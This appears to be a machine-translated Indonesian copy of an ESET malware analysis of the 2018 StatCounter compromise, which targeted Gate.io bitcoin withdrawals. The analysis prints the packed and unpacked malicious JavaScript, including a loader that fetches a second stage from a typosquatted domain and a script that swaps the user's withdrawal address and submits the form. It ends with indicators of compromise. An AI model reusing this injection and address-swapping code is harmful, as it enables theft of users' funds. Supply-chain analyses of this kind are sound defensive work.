<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👲🏿 🌗 🥨 Serangan pertukaran Gate.io cryptocurrency direkam 🏅 👩🏽 👩🏿‍⚖️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Pada 4 November, penyerang berkompromi dengan StatCounter, sebuah platform untuk menganalisis lalu lintas web. Layanan ini digunakan untuk mengumpulka...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Serangan pertukaran Gate.io cryptocurrency direkam</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/eset/blog/429050/"> Pada 4 November, penyerang berkompromi dengan StatCounter, sebuah platform untuk menganalisis lalu lintas web.  Layanan ini digunakan untuk mengumpulkan statistik tentang pengunjung situs, kira-kira seperti Google Analytics.  Untuk melakukan ini, webmaster menambahkan tag JavaScript eksternal ke setiap halaman situs yang berisi sepotong kode StatCounter - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">www.statcounter</a> [.] Com / counter / counter.js.  Menggunakan StatCounter, penyerang dapat menyuntikkan kode JavaScript ke semua situs menggunakan platform ini.  Namun, tujuan serangan itu adalah satu sumber daya - pertukaran cryptocurrency Gate.io. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/yx/_d/pb/yx_dpbi0pyq4uumbaqwpsbyx5_a.jpeg"></div><a name="habracut"></a><br>  Menurut <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">data</a> sendiri, StatCounter memiliki lebih dari dua juta situs yang berpartisipasi, ia mengumpulkan statistik pada lebih dari 10 miliar tampilan halaman web per bulan.  Peringkat Alexa-nya hanya di atas 5.000 (untuk perbandingan, situs resmi Debian Linux, debian.org, memiliki peringkat yang sebanding). <br><br><img src="https://habrastorage.org/webt/nc/it/36/ncit36glmldyeze_qr1ag_lqroi.png"><br><br>  Para penyerang memodifikasi skrip di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">www.statcounter</a> [.] Com / counter / counter.js, menambahkan sepotong kode berbahaya yang ditunjukkan dalam formulir di bawah di tengah skrip.  Ini tidak biasa karena kode jahat sering ditambahkan ke awal atau akhir file yang sah.  Kode di tengah skrip yang ada lebih sulit untuk diperhatikan jika Anda tidak membacanya. <br><br><pre><code class="javascript hljs"><span class="hljs-built_in"><span class="hljs-built_in">eval</span></span>(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">p, a, c, k, e, r</span></span></span><span class="hljs-function">) </span></span>{ e = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">c</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> c.toString(a) }; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-string"><span class="hljs-string">''</span></span>.replace(<span class="hljs-regexp"><span class="hljs-regexp">/^/</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">String</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (c--) r[e(c)] = k[c] || e(c); k = [<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> r[e] }]; e = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">'\\w+'</span></span> }; c = <span class="hljs-number"><span class="hljs-number">1</span></span> }; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (c--) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (k[c]) p = p.replace(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">RegExp</span></span>(<span class="hljs-string"><span class="hljs-string">'\\b'</span></span> + e(c) + <span class="hljs-string"><span class="hljs-string">'\\b'</span></span>, <span class="hljs-string"><span class="hljs-string">'g'</span></span>), k[c]); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> p }(<span class="hljs-string"><span class="hljs-string">'3=""+2.4;5(3.6(\'7/8/9\')&gt;-1){a 0=2.b(\'d\');0.e=\'f://ghi/cj\';0.k(\'l\',\'m\');2.nop(0)}'</span></span>, <span class="hljs-number"><span class="hljs-number">26</span></span>, <span class="hljs-number"><span class="hljs-number">26</span></span>, <span class="hljs-string"><span class="hljs-string">'ga||document|myselfloc|location|if|indexOf|myaccount|withdraw|BTC|var|createElement||script|src|https|www|statconuter|com|php|setAttribute|async|true|documentElement|firstChild|appendChild'</span></span>.split(<span class="hljs-string"><span class="hljs-string">'|'</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>, {}));</code> </pre> <br>  Script dibuat menggunakan bungkus Dean Edwards, mungkin pembungkus JavaScript paling populer.  Namun, Anda cukup mengekstraknya, yang akan menyebabkan kode skrip berjalan, seperti yang ditunjukkan di bawah ini. <br><br><pre> <code class="javascript hljs">myselfloc = <span class="hljs-string"><span class="hljs-string">''</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.location; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (myselfloc.indexOf(<span class="hljs-string"><span class="hljs-string">'myaccount/withdraw/BTC'</span></span>) &gt; <span class="hljs-number"><span class="hljs-number">-1</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ga = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'script'</span></span>); ga.src = <span class="hljs-string"><span class="hljs-string">'https://www.statconuter.com/c.php'</span></span>; ga.setAttribute(<span class="hljs-string"><span class="hljs-string">'async'</span></span>, <span class="hljs-string"><span class="hljs-string">'true'</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.documentElement.firstChild.appendChild(ga); }</code> </pre> <br>  Potongan kode memeriksa untuk melihat apakah URL tersebut mengandung <i>akun /</i> Unified Resource Identifier (URI) <i>Unaccount / withdraw / BTC</i> .  Berdasarkan ini, kita dapat menyimpulkan bahwa target para penyerang adalah platform Bitcoin.  Setelah menemukan yang diinginkan, skrip menambahkan elemen skrip baru ke halaman web, menyematkan kode <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">www.statconuter</a> [.] Com / c.php. <br><br>  Harap dicatat bahwa penyerang mendaftarkan domain yang sangat mirip dengan StatCounter yang sah.  Perbedaan dalam dua huruf - sulit untuk diperhatikan ketika melihat majalah untuk aktivitas yang mencurigakan.  By the way, memeriksa DNS pasif dari domain, kami menemukan bahwa pada 2010 itu diblokir karena pelanggaran operasional. <br><br><img src="https://habrastorage.org/webt/i2/yb/ot/i2ybotctgjeun17_viulvuexe48.png"><br><br>  Sekali lagi, skrip menargetkan pengidentifikasi spesifik (URI): <i>myaccount / withdraw / BTC</i> .  Pada saat penulisan ini, di antara semua pertukaran cryptocurrency, hanya Gate.io yang memiliki halaman valid dengan URI ini.  Tampaknya pertukaran khusus ini adalah target serangan.  Situs ini cukup populer: peringkat Alexa-nya adalah 26.251, dan peringkatnya di Cina adalah 8.308. <br><br><img src="https://habrastorage.org/webt/6l/-3/5p/6l-35pzx1sxwgtq-2fz70azyauk.png"><br><br>  Selain itu, menurut coinmarketcap.com, beberapa juta dolar melewati setiap hari melalui platform ini, termasuk $ 1,6 juta dalam bentuk bitcoin.  Secara umum, minat penyerang pada Gate.io mudah untuk dijelaskan. <br><br><img src="https://habrastorage.org/webt/ft/ei/mz/fteimzsn1pavzhmbzrlfioxddge.png"><br><br>  Halaman web <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">www.gate</a> [.] Io / myaccount / withdraw / BTC (lihat di bawah) digunakan untuk mentransfer bitcoin dari akun di gate.io ke alamat eksternal. <br><br><img src="https://habrastorage.org/webt/kg/zg/qy/kgzgqyrg27gvcsae82r8xnnsihe.png"><br><br>  Payload tahap kedua dengan statconuter [.] Com / c.php dirancang untuk mencuri bitcoin.  Script, juga dikemas menggunakan Dean Edwards, tertanam di halaman web untuk menerjemahkan bitcoin ke Gate.io.  Versi tanpa kemasan di bawah. <br><br><pre> <code class="javascript hljs"><span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.forms[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">'addr'</span></span>].value = <span class="hljs-string"><span class="hljs-string">''</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.forms[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">'amount'</span></span>].value = <span class="hljs-string"><span class="hljs-string">''</span></span>; doSubmit1 = doSubmit; doSubmit = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> a = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">'withdraw_form'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($(<span class="hljs-string"><span class="hljs-string">'#amount'</span></span>).val() &gt; <span class="hljs-number"><span class="hljs-number">10</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.forms[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">'addr'</span></span>][<span class="hljs-string"><span class="hljs-string">'name'</span></span>] = <span class="hljs-string"><span class="hljs-string">''</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> s = $(<span class="hljs-string"><span class="hljs-string">"&lt;input type='hidden' name='addr'/&gt;"</span></span>); s.attr(<span class="hljs-string"><span class="hljs-string">'value'</span></span>, <span class="hljs-string"><span class="hljs-string">'1JrFLmGVk1ho1UcMPq1WYirHptcCYr2jad'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> b = $(<span class="hljs-string"><span class="hljs-string">'#withdraw_form'</span></span>); b.append(s); a.submit(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">'canUse'</span></span>).innerText &gt; <span class="hljs-number"><span class="hljs-number">10</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.forms[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">'addr'</span></span>][<span class="hljs-string"><span class="hljs-string">'name'</span></span>] = <span class="hljs-string"><span class="hljs-string">''</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> s = $(<span class="hljs-string"><span class="hljs-string">"&lt;input type='hidden' name='addr'/&gt;"</span></span>); s.attr(<span class="hljs-string"><span class="hljs-string">'value'</span></span>, <span class="hljs-string"><span class="hljs-string">'1JrFLmGVk1ho1UcMPq1WYirHptcCYr2jad'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> b = $(<span class="hljs-string"><span class="hljs-string">'#withdraw_form'</span></span>); b.append(s); <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.forms[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">'amount'</span></span>][<span class="hljs-string"><span class="hljs-string">'name'</span></span>] = <span class="hljs-string"><span class="hljs-string">''</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = $(<span class="hljs-string"><span class="hljs-string">"&lt;input type='hidden' name='amount'/&gt;"</span></span>); t.attr(<span class="hljs-string"><span class="hljs-string">'value'</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.min(<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">'canUse'</span></span>).innerText, <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">'dayLimit'</span></span>).innerText)); b.append(t); a.submit(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { doSubmit1(); } };</code> </pre> <br>  Halaman Gate.io yang sah memiliki fungsi <code>doSubmit</code> yang dipanggil saat pengguna mengklik tombol kirim.  Dalam kasus kami, para penyerang mengubahnya. <br><br>  Skrip berbahaya secara otomatis mengganti alamat dompet bitcoin pengguna dengan alamat milik penyerang, misalnya, <code>1JrFLmGVk1ho1UcMPq1WYirHptcCYr2jad</code> .  Server penyerang menghasilkan alamat baru setiap kali pengunjung mengunduh skrip statconuter [.] Com / c.php. <br><br>  Skrip menggunakan jumlah yang dimasukkan oleh korban (jika korban mentransfer lebih dari sepuluh bitcoin) atau batas harian untuk menghapus cryptocurrency dari akun.  Di akun pengujian kami, batas penghapusan ditetapkan ke 100 BTC.  Akhirnya, skrip mengirimkan formulir yang mentransfer dana dari akun korban ke alamat dompet penyerang. <br><br>  Pengalihan dana mungkin dibuat tanpa terlihat untuk para korban, karena dompet diubah setelah mengklik tombol "Kirim".  Ini terjadi sangat cepat dan tanpa tampilan visual. <br><br>  Alamat bitcoin baru dari penjahat dunia maya dihasilkan setiap kali skrip berbahaya diminta, jadi kami tidak dapat memperkirakan penghasilan mereka.  Jika Anda memeriksa alamat yang kami gunakan pada mesin uji, keseimbangannya adalah nol. <br><br><img src="https://habrastorage.org/webt/ib/td/ke/ibtdkeoxl6lgi-bbajdt6sbddt0.png"><br><br><h3>  Kesimpulan </h3><br>  Kami tidak tahu berapa banyak bitcoin yang dicuri selama serangan ini.  Namun, insiden tersebut menunjukkan bagaimana penyerang dapat bertindak untuk menyerang sumber daya tertentu, khususnya, pertukaran mata uang kripto.  Untuk mencuri bitcoin dari pengguna satu pertukaran, mereka mengkompromikan platform analitik yang digunakan jutaan situs web, termasuk beberapa situs pemerintah. <br><br>  Selain itu, ini menunjukkan bahwa bahkan jika situs Anda diperbarui dan dilindungi secara andal, masih rentan terhadap serangan melalui sumber daya pihak ketiga.  Pengingat lain bahwa kode JavaScript eksternal pihak ketiga dapat berubah setiap saat tanpa pemberitahuan. <br><br>  Kami memperingatkan StatCounter dan Gate.io tentang aktivitas jahat. <br><br><h3>  Indikator kompromi </h3><br>  <b>URL berbahaya</b> <br><br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">www.statcounter</a> [.] Com / counter / counter.js <br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">www.statconuter</a> [.] Com / c.php </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id429050/">https://habr.com/ru/post/id429050/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id429040/index.html">Menambal kode Java pada produksi tanpa anestesi</a></li>
<li><a href="../id429042/index.html">Kami sedang menguji SharxBase, platform virtualisasi perangkat lunak dan perangkat keras dari vendor Rusia SharxDC</a></li>
<li><a href="../id429044/index.html">Saham Apple telah mengalami kejatuhan terburuk sejak 2014. Investor besar telah kehilangan miliaran</a></li>
<li><a href="../id429046/index.html">Empat tahun pengembangan SObjectizer-5.5. Bagaimana SObjectizer berubah selama waktu ini?</a></li>
<li><a href="../id429048/index.html">Kiat untuk pemula hoster</a></li>
<li><a href="../id429052/index.html">Mengapa pada laptop-sentuh beberapa SPA tidak lagi mendukung event sentuh</a></li>
<li><a href="../id429054/index.html">Temukan N Perbedaan. Pengalaman pengujian tata letak Tinkoff.ru</a></li>
<li><a href="../id429056/index.html">Fisika, bukan biologi, membuat penuaan tak terhindarkan</a></li>
<li><a href="../id429058/index.html">Menggunakan Retrofit 2 di aplikasi Android</a></li>
<li><a href="../id429060/index.html">Konsep pikiran yang ideal. AI Universal</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>